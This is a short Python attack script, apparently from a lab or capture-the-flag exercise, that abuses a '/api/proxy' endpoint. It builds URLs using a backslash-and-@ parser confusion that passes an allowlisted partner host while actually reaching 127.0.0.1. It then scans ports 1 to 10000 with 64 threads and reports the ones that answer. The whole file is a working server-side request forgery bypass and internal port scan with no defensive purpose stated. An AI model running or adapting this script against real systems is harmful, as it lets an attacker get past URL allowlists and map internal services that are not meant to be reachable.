import requests, concurrent.futures as cf
P="http://127.0.0.1:24606/api/proxy"
s=requests.Session()
def probe(p):
    u=f"http://rates.partner-forex.example.com\\@127.0.0.1:{p}/"
    try:
        r=s.get(P, params={"url":u}, timeout=5)
        if "upstream unreachable" not in r.text:
            return (p, r.status_code, r.text[:80].replace("\n"," "))
    except Exception:
        pass
    return None
res=[]
with cf.ThreadPoolExecutor(max_workers=64) as ex:
    for out in ex.map(probe, range(1,10001)):
        if out: res.append(out); print(out, flush=True)
print("done", res)
